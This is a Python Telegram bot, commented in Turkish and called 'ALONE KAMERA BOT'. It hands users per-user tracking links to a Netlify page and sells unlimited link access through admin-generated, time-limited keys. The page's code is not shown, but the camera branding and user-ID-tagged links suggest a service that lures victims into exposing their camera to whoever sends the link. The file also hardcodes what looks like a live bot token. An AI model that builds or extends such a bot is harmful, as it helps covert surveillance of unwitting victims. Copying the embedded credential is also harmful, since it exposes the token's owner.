import asyncio
import secrets
import datetime
import os
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

# ====================== AYARLAR ======================
TELEGRAM_TOKEN = os.getenv("TOKEN") or "8697300838:AAH7H4d2SGo5FihxMgIAbQ0W-nr160BkgT8"
ADMIN_ID = 8064250098

bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher()

# ====================== VERİ ======================
vip_users = set()
user_keys = {}      # {user_id: expiry_datetime}
active_keys = {}    # {key: expiry_datetime}
user_link_count = {}  # {user_id: count} → ücretsiz link sayısı

durations = {
    "10dk": datetime.timedelta(minutes=10),
    "1saat": datetime.timedelta(hours=1),
    "1gun": datetime.timedelta(days=1),
    "5gun": datetime.timedelta(days=5),
    "1hafta": datetime.timedelta(weeks=1),
    "1ay": datetime.timedelta(days=30),
}

# ====================== START =================
@dp.message(Command("alone"))
async def start_handler(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Sahibim", url="https://t.me/aloneiste")],
        [InlineKeyboardButton(text="📢 Kanal", url="https://t.me/atattv44yedek")],
        [InlineKeyboardButton(text="🔗 Özel Link", callback_data="get_link")],
        [InlineKeyboardButton(text="🔑 Key Kullan", callback_data="use_key")]
    ])
    await message.answer("ALONE KAMERA BOT'una Hoş geldin! 👋\nButonlardan seçim yapabilirsin:", reply_markup=keyboard)

# ====================== ÖZEL LİNK (3 KERELİK SINIR) =================
@dp.callback_query(lambda c: c.data == "get_link")
async def get_link(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    if user_id in user_keys and datetime.datetime.now() < user_keys[user_id]:
        special_link = f"https://alonedeneme.netlify.app/?uid={user_id}"
        await callback.message.answer(f"🔗 Senin özel linkin:\n{special_link}\n\n✅ Key süren aktif, sınırsız kullanabilirsin.")
        await callback.answer()
        return

    count = user_link_count.get(user_id, 0)
    if count >= 3:
        await callback.message.answer("❌ Ücretsiz link hakkın bitti!\nKey kullanman gerekiyor.\n\n/key <kod>")
        await callback.answer()
        return

    special_link = f"https://alonedeneme.netlify.app/?uid={user_id}"
    user_link_count[user_id] = count + 1
    remaining = 3 - user_link_count[user_id]

    await callback.message.answer(f"🔗 Senin özel linkin:\n{special_link}\n\nÜcretsiz kalan hakkın: **{remaining}**")
    await callback.answer()

# ====================== ADMIN PANEL =================
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ VIP Yap", callback_data="admin_vip")],
        [InlineKeyboardButton(text="🔑 Key Üret", callback_data="admin_key")],
        [InlineKeyboardButton(text="📜 Keys Listele", callback_data="admin_keys")],
        [InlineKeyboardButton(text="👥 Tüm Kullanıcılar", callback_data="all_users")],
        [InlineKeyboardButton(text="📢 Toplu Duyuru", callback_data="broadcast")]
    ])
    await message.answer("🔐 **Admin Paneli**", reply_markup=keyboard)

# ====================== TÜM KULLANICILAR (İSTENEN ÖZELLİK) =================
@dp.callback_query(lambda c: c.data == "all_users")
async def all_users(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    text = "👥 **Tüm Kullanıcılar**\n\n"
    all_users_set = set(list(user_keys.keys()) + list(user_link_count.keys()))

    for user_id in all_users_set:
        key_status = "✅ Key Aktif" if (user_id in user_keys and datetime.datetime.now() < user_keys[user_id]) else "❌ Key Yok"
        link_count = user_link_count.get(user_id, 0)
        text += f"• `{user_id}` | Link: {link_count}/3 | {key_status}\n"

    await callback.message.answer(text or "Henüz kullanıcı yok.")
    await callback.answer()

# ====================== TOPLU DUYURU =================
@dp.callback_query(lambda c: c.data == "broadcast")
async def broadcast_start(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    await callback.message.answer("📢 Toplu duyuru için **metin** veya **görsel** gönderin:")

# ====================== KEY ÜRETME =================
@dp.callback_query(lambda c: c.data == "admin_key")
async def admin_key(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="10 dk", callback_data="key_10dk"),
         InlineKeyboardButton(text="1 saat", callback_data="key_1saat")],
        [InlineKeyboardButton(text="1 gün", callback_data="key_1gun"),
         InlineKeyboardButton(text="5 gün", callback_data="key_5gun")],
        [InlineKeyboardButton(text="1 hafta", callback_data="key_1hafta"),
         InlineKeyboardButton(text="1 ay", callback_data="key_1ay")]
    ])
    await callback.message.answer("Key süresi seç:", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data.startswith("key_"))
async def generate_key(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    duration_name = callback.data.replace("key_", "")
    expiry = datetime.datetime.now() + durations[duration_name]
    key = secrets.token_hex(8)
    active_keys[key] = expiry
    await callback.message.answer(f"🔑 Key üretildi ({duration_name}):\n`{key}`", parse_mode="Markdown")

# ====================== KEY LİSTELE =================
@dp.callback_query(lambda c: c.data == "admin_keys")
async def list_keys(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not active_keys:
        await callback.message.answer("📜 Şu anda aktif key yok.")
        return
    msg = "📜 Aktif Keyler:\n"
    for k, exp in active_keys.items():
        msg += f"- `{k}` → {exp}\n"
    await callback.message.answer(msg, parse_mode="Markdown")

# ====================== KEY KULLANMA =================
@dp.message(Command("key"))
async def use_key_command(message: types.Message):
    try:
        _, key = message.text.split()
    except:
        await message.answer("Kullanım: /key <kod>")
        return
    await activate_key(message.from_user.id, key, message)

@dp.callback_query(lambda c: c.data == "use_key")
async def use_key_button(callback: types.CallbackQuery):
    await callback.message.answer("🔑 Key kodunu şu şekilde gir: /key <kod>")

async def activate_key(user_id, key, message):
    if key not in active_keys:
        await message.answer("❌ Geçersiz veya kullanılmış key.")
        return

    expiry = active_keys.pop(key)
    user_keys[user_id] = expiry
    await message.answer(f"✅ Key aktif edildi!\nSüre: {expiry.strftime('%Y-%m-%d %H:%M')} tarihine kadar sınırsız kullanabilirsin.")

# ====================== BAŞLAT ======================
async def main():
    print("🚀 Alone Kamera Botu Başlatıldı")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
